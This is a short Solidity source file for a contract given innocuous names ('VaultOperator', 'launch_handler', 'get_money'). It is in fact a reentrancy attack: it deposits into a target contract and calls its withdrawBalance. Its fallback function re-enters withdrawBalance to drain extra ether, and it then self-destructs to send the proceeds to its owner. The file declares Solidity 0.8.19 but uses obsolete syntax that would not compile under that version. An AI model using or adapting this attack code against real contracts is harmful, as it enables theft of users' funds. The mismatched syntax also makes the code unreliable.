// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract VaultOperator {
    bool public operationActive=false;
    address public target_contract;
    address public owner;

    function VaultOperator() public{
        owner = msg.sender;
    }

    function deposit(address _target_contract) public payable{
        target_contract = _target_contract ;
        // call addToBalance with msg.value ethers
        require(target_contract.call.value(msg.value)(bytes4(sha3("addToBalance()"))));
    }

    function launch_handler() public{
        operationActive = true;
        // call withdrawBalance

        require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
    }

    function () public payable{

        if (operationActive){
            operationActive = false;
                require(target_contract.call(bytes4(sha3("withdrawBalance()"))));
        }
    }

    function get_money(){
        suicide(owner);
    }

}